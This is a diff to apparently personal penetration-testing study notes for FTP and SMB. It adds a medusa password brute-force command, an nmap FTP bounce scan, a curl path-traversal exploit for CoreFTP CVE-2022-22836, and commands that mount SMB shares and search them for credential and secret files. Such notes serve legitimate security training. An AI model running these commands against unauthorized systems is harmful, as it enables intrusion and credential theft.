@@ -37,10 +37,12 @@ telnet TARGET_IP 21
 
 - [ ] Check for Anonymous Login
 - [ ] Check if we have the permissions to upload files to the FTP server
-- [ ] Check if the FTP server runs with TLS/SSL encryption.
+- [ ] Try brute forcing with medusa `medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp `
 - [ ] Nmap
     - [ ] Scanning TCP port 21 `sudo nmap -sV -p21 -sC -A TARGET_IP`
     - [ ] Scanning with Nmap Scripts `find / -type f -name ftp* 2>/dev/null | grep scripts`
+    - [ ] `-b` flag can be used to perform an FTP bounce attack: `nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2`
+- [ ] Check for CoreFTP before build 727 vulnerability assigned CVE-2022-22836.Exploitation: `curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops`
 
 
 > [!TIP]
@@ -108,7 +110,46 @@ telnet TARGET_IP 21
     - [ ] Scanning 139,445 ports `sudo nmap TARGET_IP -sV -sC -p139,445`
     - [ ] Scanning with Nmap Scripts `find / -type f -name smb* 2>/dev/null | grep scripts`
 
+- **Server Message Block (SMB) with Windows**: 
+    - Navigate share using GUI. We can press [WINKEY] + [R] to open the Run dialog box and type the file share location, e.g.: `\\192.168.220.129\Finance\`
+    - Using CMD:
+        - To list subdirectory and files `C:\htb> dir \\192.168.220.129\Finance\`
+        - We can connect to a file share with the following command and map its content to the drive letter n: `C:\htb> net use n: \\192.168.220.129\Finance`. We can also provide a username and password to authenticate to the share: `C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123`
+        - To know how many files the shared folder and its subdirectories contain (drive letter n): `C:\htb> dir n: /a-d /s /b | find /c ":\"`
+        - Search about secrets in the share: 
+        ```
+        C:\htb>dir n:\*cred* /s /b
 
+        n:\Contracts\private\credentials.txt
+
+
+        C:\htb>dir n:\*secret* /s /b
+
+        n:\Contracts\private\secret.txt
+        ```
+        - Search for a specific word within a text file: `c:\htb>findstr /s /i cred n:\*.*`
+    - Using Poweshell:
+        - To list subdirectory and files `PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\`
+        - Instead of net use, we can use New-PSDrive in PowerShell: `PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"`
+        - To provide a username and password with Powershell, we need to create a PSCredential object:
+        ```
+        PS C:\htb> $username = 'plaintext'
+        PS C:\htb> $password = 'Password123'
+        PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
+        PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+        PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
+        ```
+        - We can use the command Get-ChildItem or the short variant gci instead of the command dir: `PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count`
+        - Search about secrets in the share: `PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File`
+        - We can use Select-String similar to grep in UNIX or findstr.exe in Windows: `PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List`
+
+- **Server Message Block (SMB) with Linux**: 
+    - Mount the share: 
+    ```
+    abdeonix@htb[/htb]$ sudo mkdir /mnt/Finance
+    abdeonix@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+    ```
+    - Search about secrets: `abdeonix@htb[/htb]$ find /mnt/Finance/ -name *cred*`, `abdeonix@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred`
 
 
 ## NFS
